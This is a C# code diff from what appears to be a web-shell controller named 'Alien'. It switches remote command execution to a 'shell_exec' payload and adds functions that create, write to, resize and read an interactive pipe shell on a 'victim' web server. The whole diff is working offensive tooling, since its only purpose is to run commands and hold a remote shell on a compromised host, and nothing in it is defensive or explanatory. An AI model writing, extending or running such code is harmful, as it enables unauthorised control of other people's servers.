@@ -34,7 +34,7 @@ namespace Alien
             else
                 szCurrentDir = $"cd /d \"{m_szCurrentDir}\" & {szCommand} & echo [{szSplitter}] & cd";
 
-            string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { szCurrentDir, m_web.m_victim.ShellEncoding });
+            string szResp = await m_web.fnszSendPayload("shell_exec", new string[] { szCurrentDir, m_web.m_victim.ShellEncoding });
             string[] asResp = szResp.Split($"[{szSplitter}]");
             
             if (asResp.Length == 2)
@@ -51,6 +51,60 @@ namespace Alien
             }
 
             return (szCurrentDir, szOutput);
+        }
+
+        public async Task fnPipeCreate(string szApp)
+        {
+            _ = Task.Run(async () =>
+            {
+                try
+                {
+                    await m_web.fnszSendPayload("shell_virtual", new string[] { "create", szApp });
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Pipe shell is terminated:\n" + ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            });
+        }
+
+        public async Task<bool> fnPipeWrite(string szB64Data)
+        {
+            try
+            {
+                string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "write", szB64Data });
+                return szResp.Contains("success");
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        public async Task<bool> fnPipeResize(string szCols, string szRows)
+        {
+            try
+            {
+                string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "resize", szCols, szRows });
+                return szResp.Contains("success");
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        public async Task<string> fnPipeRead()
+        {
+            try
+            {
+                string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "read" });
+                return szResp;
+            }
+            catch
+            {
+                return string.Empty;
+            }
         }
     }
 }
